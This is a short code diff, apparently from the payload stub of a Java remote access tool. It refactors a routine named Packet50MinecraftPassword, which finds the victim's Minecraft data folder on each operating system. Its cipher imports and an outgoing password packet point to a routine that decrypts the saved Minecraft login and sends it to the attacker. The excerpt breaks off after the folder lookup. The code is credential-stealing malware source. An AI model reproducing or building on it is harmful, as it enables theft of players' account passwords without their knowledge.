@@ -13,25 +13,26 @@ import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.PBEParameterSpec;
 
 import com.redpois0n.Connection;
+import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.stub.packets.outgoing.Packet36MinecraftPassword;
 
 
-public class PacketMC extends AbstractIncomingPacket {
+public class Packet50MinecraftPassword extends AbstractIncomingPacket {
 
 	@SuppressWarnings("unused")
 	@Override
 	public void read() throws Exception {
-		String os = System.getProperty("os.name", "").toLowerCase();
 		String home = System.getProperty("user.home", ".");
+		
 		File file = null;
-		if (os.contains("win")) {
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			String appdata = System.getenv("APPDATA");
 			if (appdata != null) {
 				file = new File(appdata, ".minecraft");
 			} else {
 				file = new File(home, ".minecraft");
 			}
-		} else if (os.contains("mac")) {
+		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 			file = new File(home, "Library/Application Support/minecraft");
 		} else {
 			file = new File(home, ".minecraft/");
